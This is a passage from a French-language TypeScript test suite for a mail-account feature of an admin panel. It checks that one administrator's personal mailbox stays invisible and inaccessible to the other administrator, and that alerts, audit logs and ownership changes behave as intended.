  let bobBrowser: Browser;

  /** Serveur IMAP de la boîte personnelle d'Alice : un message confidentiel avec pièce jointe. */
  async function aliceServer(): Promise<FakeServer> {
    const message = await invoiceMessage(77);
    message.envelope.subject = 'Résultats médicaux confidentiels';
    return {
      password: 'mdp-Alice-Perso-3',
      secure: true,
      connectError: null,
      folders: [
        { path: 'INBOX', name: 'INBOX' },
        { path: 'Envoyés', name: 'Envoyés', specialUse: '\\Sent' },
        { path: 'Corbeille', name: 'Corbeille', specialUse: '\\Trash' },
      ],
      boxes: new Map([
        ['INBOX', [message]],
        ['Envoyés', []],
        ['Corbeille', []],
      ]),
      appended: [],
    };
  }

  beforeEach(async () => {
    mock.servers.set('imap.alice.test', await aliceServer());
    // La session principale reste active malgré les avances d'horloge des autres blocs.
    expect((await browser.get('/api/mail/accounts')).status).toBe(200);
    if (bobBrowser) expect((await bobBrowser.get('/api/mail/accounts')).status).toBe(200);
  });

  /** Toutes les routes /api/mail/accounts/:id/** — la règle d'accès doit valoir pour chacune. */
  const everyRoute = (id: number) =>
    [
      ['GET', `/api/mail/accounts/${id}/folders`],
      ['GET', `/api/mail/accounts/${id}/messages`],
      ['GET', `/api/mail/accounts/${id}/messages?search=confidentiel`],
      ['GET', `/api/mail/accounts/${id}/messages/77`],
      ['GET', `/api/mail/accounts/${id}/messages/77/attachments/2`],
      ['POST', `/api/mail/accounts/${id}/messages/77/flags`, { seen: true }],
      ['POST', `/api/mail/accounts/${id}/messages/77/move`, { destination: 'Corbeille' }],
      ['DELETE', `/api/mail/accounts/${id}/messages/77`],
      ['POST', `/api/mail/accounts/${id}/send`, { to: ['x@exemple.test'], subject: 'Objet', text: 'Texte' }],
      ['POST', `/api/mail/accounts/${id}/send`, { to: ['x@exemple.test'], subject: 'Re', text: 'Texte', inReplyTo: { folder: 'INBOX', uid: 77 } }],
      ['POST', `/api/mail/accounts/${id}/test`, {}],
      ['PUT', `/api/mail/accounts/${id}`, { ...personalInput, label: 'Détournée', visibility: 'shared' }],
      ['PUT', `/api/mail/accounts/${id}`, { ...personalInput, visibility: 'personal' }],
      ['DELETE', `/api/mail/accounts/${id}`],
    ] as [method: 'GET' | 'POST' | 'PUT' | 'DELETE', url: string, body?: Record<string, unknown>][];

  async function call(target: Browser, method: 'GET' | 'POST' | 'PUT' | 'DELETE', url: string, body?: Record<string, unknown>) {
    if (method === 'GET') return target.get(url);
    if (method === 'DELETE') return target.delete(url);
    if (method === 'PUT') return target.put(url, body ?? {});
    return target.post(url, body ?? {});
  }

  it('une boîte créée « personnelle » appartient à son créateur ; « partagée » par défaut', async () => {
    bobBrowser = new Browser(app, uniqueIp());
    await bobBrowser.login(bob);
    await stepUp();
    const created = await browser.post<MailAccount>('/api/mail/accounts', personalInput);
    expect(created.status).toBe(201);
    personalId = created.body.data.id;
    expect(created.body.data).toMatchObject({ visibility: 'personal', ownedByMe: true, address: PERSONAL_ADDRESS });
    expect(db.prepare('SELECT owner_user_id FROM mail_accounts WHERE id = ?').get(personalId)).toEqual({ owner_user_id: alice.user.id });
    // Le compte partagé existant n'a pas de propriétaire.
    expect(db.prepare('SELECT owner_user_id FROM mail_accounts WHERE id = ?').get(supportId)).toEqual({ owner_user_id: null });
    expect(JSON.parse(lastAudit('mail.account.create').details!)).toMatchObject({ visibility: 'personal' });

    // Aucun champ ne permet de choisir le propriétaire.
    for (const patch of [{ ownerUserId: bob.user.id }, { owner_user_id: bob.user.id }, { ownedByMe: false }, { visibility: 'private' }]) {
      expect((await browser.post('/api/mail/accounts', { ...personalInput, ...patch })).status, JSON.stringify(patch)).toBe(400);
    }
  });

  it('les listes ne montrent que les boîtes partagées et les siennes', async () => {
    const forAlice = await browser.get<MailAccount[]>('/api/mail/accounts');
    expect(forAlice.body.data.map((a) => [a.id, a.visibility, a.ownedByMe])).toEqual([
      [supportId, 'shared', false],
      [personalId, 'personal', true],
    ]);
    const forBob = await bobBrowser.get<MailAccount[]>('/api/mail/accounts');
    expect(forBob.body.data.map((a) => [a.id, a.visibility, a.ownedByMe])).toEqual([[supportId, 'shared', false]]);
    expect(JSON.stringify(forBob.body)).not.toMatch(/alice\.perso|Perso Alice|imap\.alice/);

    // Résumé des non-lus : Alice d'abord (le cache de sa boîte est rempli), puis Bob ne la voit pas pour autant.
    const aliceSummary = await browser.get<MailUnreadSummary>('/api/mail/unread-summary');
    expect(aliceSummary.body.data.accounts.map((a) => a.accountId)).toEqual([supportId, personalId]);
    expect(aliceSummary.body.data.total).toBe(3);
    const bobSummary = await bobBrowser.get<MailUnreadSummary>('/api/mail/unread-summary');
    expect(bobSummary.body.data).toEqual({ total: 2, accounts: [{ accountId: supportId, label: 'Support', address: 'support@exemple.test', unread: 2, error: null }] });
    expect(JSON.stringify(bobSummary.body)).not.toMatch(/alice\.perso|Perso Alice/);
  });

  it('pour l’autre administrateur, CHAQUE route répond 404 comme pour un compte inexistant, sans aucune connexion', async () => {
    await stepUp(bobBrowser, bob);
    for (const [method, url, body] of everyRoute(personalId)) {
      const missing = await call(bobBrowser, method, url.replace(`/accounts/${personalId}`, '/accounts/987654'), body);
      const res = await call(bobBrowser, method, url, body);
      expect(res.status, `${method} ${url}`).toBe(404);
      expect(res.body, `${method} ${url}`).toEqual(missing.body);
      expect(missing.status).toBe(404);
      expect(JSON.stringify(res.raw.headers)).not.toMatch(/alice/i);
    }
    // Rien n'a touché la boîte : ni connexion IMAP/SMTP, ni modification en base.
    expect(mock.instances).toHaveLength(0);
    expect(mock.smtp.transports).toHaveLength(0);
    expect(db.prepare('SELECT label, owner_user_id FROM mail_accounts WHERE id = ?').get(personalId)).toEqual({ label: 'Perso Alice', owner_user_id: alice.user.id });
    expect(mock.servers.get('imap.alice.test')!.boxes.get('INBOX')!.map((m) => [m.uid, [...m.flags]])).toEqual([[77, []]]);
    // Le journal de Bob ne contient rien qui révèle la boîte.
    const journal = await bobBrowser.get('/api/security/audit?pageSize=100');
    expect(JSON.stringify(journal.body)).not.toMatch(/alice\.perso|Perso Alice|imap\.alice/);
  });

  it('le propriétaire accède à chaque route de sa boîte personnelle', async () => {
    await stepUp();
    const results: [string, number][] = [];
    for (const [method, url, body] of everyRoute(personalId)) {
      if (method === 'DELETE' && url.endsWith(`/accounts/${personalId}`)) continue; // supprimée plus loin
      if (url.includes('/move') || (method === 'DELETE' && url.includes('/messages/'))) continue; // testés à part
      const effective = method === 'PUT' ? { ...personalInput, visibility: 'personal' } : body;
      const res = await call(browser, method, url, effective);
      results.push([`${method} ${url}`, res.status]);
    }
    expect(results.filter(([, status]) => status !== 200)).toEqual([]);
    expect(new Set(mock.calls.map((c) => c.host))).toEqual(new Set(['imap.alice.test']));
    expect(mock.smtp.sent).toHaveLength(2);
    expect(mock.smtp.sent.every((s) => s.message.envelope.from === PERSONAL_ADDRESS)).toBe(true);
    const moved = await browser.post(`/api/mail/accounts/${personalId}/messages/77/move`, { destination: 'Corbeille' });
    expect(moved.status).toBe(200);
    const removed = await browser.delete(`/api/mail/accounts/${personalId}/messages/77?folder=Corbeille`);
    expect(removed.status).toBe(200);
  });

  it('une opération sur une boîte personnelle n’alerte que son propriétaire : l’autre administrateur n’en apprend rien', async () => {
    await stepUp();
    outbox.length = 0;
    const created = await browser.post<MailAccount>('/api/mail/accounts', { ...personalInput, label: 'Perso Alice 2', address: 'alice.secret@exemple.test' });
    expect(created.status).toBe(201);
    const { password: _password, ...withoutPassword } = personalInput;
    expect((await browser.put(`/api/mail/accounts/${created.body.data.id}`, { ...withoutPassword, label: 'Perso Alice 2b', address: 'alice.secret@exemple.test' })).status).toBe(200);
    expect((await browser.delete(`/api/mail/accounts/${created.body.data.id}`)).status).toBe(200);

    const mails = await alertMails('Compte mail personnel');
    expect(mails.map((m) => m.subject)).toEqual([
      '[TalCloud Panel] Compte mail personnel ajouté',
      '[TalCloud Panel] Compte mail personnel modifié',
      '[TalCloud Panel] Compte mail personnel supprimé',
    ]);
    for (const mail of mails) {
      // Destinataire unique : le propriétaire. Ni Bob, ni Discord commun, ni notification commune.
      expect(mail.to).toEqual([alice.email]);
      expect(`${mail.subject}${mail.text}${mail.html}`).not.toMatch(/alice\.secret|Perso Alice|imap\.alice|smtp\.alice/);
      expect(mail.text).toContain('Un compte de messagerie personnel a été');
      expect(mail.text).toContain('par alice');
    }
    expect(outbox.some((m) => (Array.isArray(m.to) ? m.to : [m.to]).includes(bob.email))).toBe(false);
    const notifications = JSON.stringify(db.prepare('SELECT title, body, data FROM notifications').all());
    expect(notifications).not.toMatch(/alice\.secret|alice\.perso|Perso Alice/);
    const personalNotifications = db.prepare("SELECT user_id FROM notifications WHERE title LIKE 'Compte mail personnel %'").all() as { user_id: number | null }[];
    expect(personalNotifications.length).toBeGreaterThanOrEqual(3);
    expect(personalNotifications.every((n) => n.user_id === alice.user.id)).toBe(true);
    const bobCenter = await bobBrowser.get<{ title: string }[]>('/api/notifications?pageSize=100');
    expect(bobCenter.body.data.map((n) => n.title).filter((t) => /personnel/.test(t))).toEqual([]);
  });

  it('textes d’alerte : adresse uniquement pour une boîte partagée (ou qui l’était)', () => {
    const shared = { address: 'support@exemple.test', owner_user_id: null };
    const personal = { address: 'secret@exemple.test', owner_user_id: 1 };
    expect(accountAlertText('ajouté', 'alice', null, shared).summary).toContain('support@exemple.test');
    expect(accountAlertText('ajouté', 'alice', null, personal).summary).not.toContain('secret@');
    expect(accountAlertText('modifié', 'alice', personal, personal).summary).not.toContain('secret@');
    expect(accountAlertText('supprimé', 'alice', personal, null).summary).not.toContain('secret@');
    expect(accountAlertText('modifié', 'alice', shared, { ...personal, address: 'nouvelle@exemple.test' })).toEqual({
      title: 'Compte mail partagé rendu personnel',
      summary: "Le compte de messagerie partagé support@exemple.test a été rendu personnel par alice : il lui est désormais réservé et n'est plus accessible à l'autre administrateur.",
    });
    expect(accountAlertText('modifié', 'alice', personal, { ...shared, address: 'secret@exemple.test' }).title).toBe('Compte mail personnel rendu partagé');
  });

  it('seul le propriétaire peut rendre partagée sa boîte ; elle devient alors visible des deux', async () => {
    const { password: _password, ...withoutPassword } = personalInput;
    await stepUp(bobBrowser, bob);
    expect((await bobBrowser.put(`/api/mail/accounts/${personalId}`, { ...withoutPassword, visibility: 'shared' })).status).toBe(404);
    expect(db.prepare('SELECT owner_user_id FROM mail_accounts WHERE id = ?').get(personalId)).toEqual({ owner_user_id: alice.user.id });

    // Sans « visibility », la visibilité est inchangée.
    await stepUp();
    const unchanged = await browser.put<MailAccount>(`/api/mail/accounts/${personalId}`, { ...withoutPassword, visibility: undefined, label: 'Perso Alice' });
    expect(unchanged.body.data).toMatchObject({ visibility: 'personal', ownedByMe: true });

    outbox.length = 0;
    const shared = await browser.put<MailAccount>(`/api/mail/accounts/${personalId}`, { ...withoutPassword, visibility: 'shared' });
    expect(shared.status).toBe(200);
    expect(shared.body.data).toMatchObject({ visibility: 'shared', ownedByMe: false });
    expect(JSON.parse(lastAudit('mail.account.update').details!)).toMatchObject({ visibility: 'shared', visibilityChanged: true });
    expect((await alertMails('Compte mail personnel rendu partagé')).length).toBe(1);

    const forBob = await bobBrowser.get<MailAccount[]>('/api/mail/accounts');
    expect(forBob.body.data.map((a) => a.id)).toContain(personalId);
    expect((await bobBrowser.get(`/api/mail/accounts/${personalId}/folders`)).status).toBe(200);
  });

  it('rendre personnelle une boîte partagée la donne à l’auteur, retire l’accès à l’autre et l’avertit', async () => {
    // Bob s'approprie la boîte (désormais partagée) : elle devient la sienne, jamais celle d'Alice.
    await stepUp(bobBrowser, bob);
    outbox.length = 0;
    const { password: _password, ...withoutPassword } = personalInput;
    const taken = await bobBrowser.put<MailAccount>(`/api/mail/accounts/${personalId}`, { ...withoutPassword, visibility: 'personal' });
    expect(taken.status).toBe(200);
    expect(taken.body.data).toMatchObject({ visibility: 'personal', ownedByMe: true });
    expect(db.prepare('SELECT owner_user_id FROM mail_accounts WHERE id = ?').get(personalId)).toEqual({ owner_user_id: bob.user.id });

    const alert = await alertMails('Compte mail partagé rendu personnel');
    expect(alert).toHaveLength(1);
    expect(alert[0]!.to).toEqual([alice.email, bob.email]);
    expect(alert[0]!.text).toContain(`partagé ${PERSONAL_ADDRESS} a été rendu personnel par bob`);
    expect(alert[0]!.text).toContain("n'est plus accessible à l'autre administrateur");

    // Alice n'y a plus accès, sur aucune route, et ne la voit plus dans ses listes.
    await stepUp();
    for (const [method, url, body] of everyRoute(personalId)) {
      expect((await call(browser, method, url, body)).status, `${method} ${url}`).toBe(404);
    }
    expect((await browser.get<MailAccount[]>('/api/mail/accounts')).body.data.map((a) => a.id)).toEqual([supportId]);
    expect((await browser.get<MailUnreadSummary>('/api/mail/unread-summary')).body.data.accounts.map((a) => a.accountId)).toEqual([supportId]);

    // Le propriétaire (Bob) y accède, et lui seul peut la supprimer.
    expect((await bobBrowser.get(`/api/mail/accounts/${personalId}/messages`)).status).toBe(200);
    expect((await bobBrowser.get<MailUnreadSummary>('/api/mail/unread-summary')).body.data.accounts.map((a) => a.accountId)).toEqual([supportId, personalId]);
    await stepUp(bobBrowser, bob);
    outbox.length = 0;
    expect((await bobBrowser.delete(`/api/mail/accounts/${personalId}`)).status).toBe(200);
    const deletion = await alertMails('Compte mail personnel supprimé');
    expect(deletion).toHaveLength(1);
    expect(`${deletion[0]!.text}${deletion[0]!.html}`).not.toContain(PERSONAL_ADDRESS);
  });

  it('une boîte partagée reste utilisable par les deux administrateurs', async () => {
    expect((await browser.get(`/api/mail/accounts/${supportId}/messages`)).status).toBe(200);
    expect((await bobBrowser.get(`/api/mail/accounts/${supportId}/messages`)).status).toBe(200);
    expect((await bobBrowser.post(`/api/mail/accounts/${supportId}/messages/12/flags`, { flagged: true })).status).toBe(200);
  });
});
